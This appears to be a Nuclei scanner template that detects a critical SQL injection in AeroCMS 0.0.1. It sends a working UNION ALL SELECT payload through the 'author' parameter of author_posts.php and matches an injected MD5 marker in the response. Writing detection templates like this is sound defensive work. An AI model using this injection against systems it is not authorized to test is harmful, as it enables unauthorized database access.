id: aerocms-sqli
info:
  name: AeroCMS 0.0.1 - SQL Injection
  author: shivampand3y
  severity: critical
  description: AeroCMS 0.0.1 is vulnerable to SQL injection through the author parameter,
    allowing attackers to gain access to sensitive information or execute unauthorized
    administrative operations.
  reference:
  - https://www.exploit-db.com/exploits/51022
  - https://github.com/MegaTKC/AeroCMS/releases/tag/v0.0.1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    verified: true
    impact: The SQL injection vulnerability in AeroCMS 0.0.1 can lead to unauthorized
      access, modification, and execution, potentially causing significant impact
      on the affected site and its users.
    recommendation: It is highly recommended to update AeroCMS to a newer version
      that has fixed the SQL injection vulnerability to avoid any potential security
      risks.
  tags: aero,cms,sqli,edb
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
  - '{{BaseURL}}/cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '{{md5(num)}}'
  - type: status
    status:
    - 200
